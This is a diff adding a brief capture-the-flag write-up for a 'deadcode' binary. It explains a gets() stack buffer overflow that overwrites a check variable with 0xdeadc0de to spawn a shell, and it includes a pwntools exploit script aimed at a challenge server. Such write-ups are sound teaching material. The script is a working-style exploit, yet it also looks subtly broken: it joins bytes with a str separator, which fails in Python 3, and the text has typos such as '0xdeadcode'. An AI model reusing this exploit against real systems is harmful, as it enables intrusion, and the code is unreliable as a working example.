@@ -1,0 +1,27 @@
+DEADCODE_WRITEUP
+
+VULN: BUFFER OVERFLOW
+
+VULN_FUNC: GETS(LOCAL_28)
+
+GOAL: overwrite address in memory associated with a var used to check against a value in memory in order to get a shell. 
+
+INVESTIGATE: First, open the elf in ghidra for easy viewability of what's going on. Start in main, and we see a vuln gets function, two variables (local_28 w/ 24 bytes, and local_10 with 8 bytes), and one of variables is checked against 0xdeadc0de. If it our var is equal, it launches a shell. 
+
+INTERWORKINGS: The var that we have access to through gets(), local_28, is located above the check var, local_10, on the stack. If the values are the same, it launches a shell. So, we fill the address designated for local_28, which is 24 bites, to begin writing to local_10. So, we make a payload of a 24 byte string and append the p64 encoded byte string of hex value 0xdeadcode. 
+
+CODE:
+from pwn import * 
+
+offset = 24
+#s = process("./deadcode")
+s = connect("cmgr.c3t.eecs.net", 49509)
+payload = [b'a'*offset,
+            p64(0xdeadc0de)
+            ]
+payload = ''.join(payload)
+print(payload)
+print(s.recvuntil("\n"))
+s.send(payload)
+s.interactive()
+# $ cat flat.txt
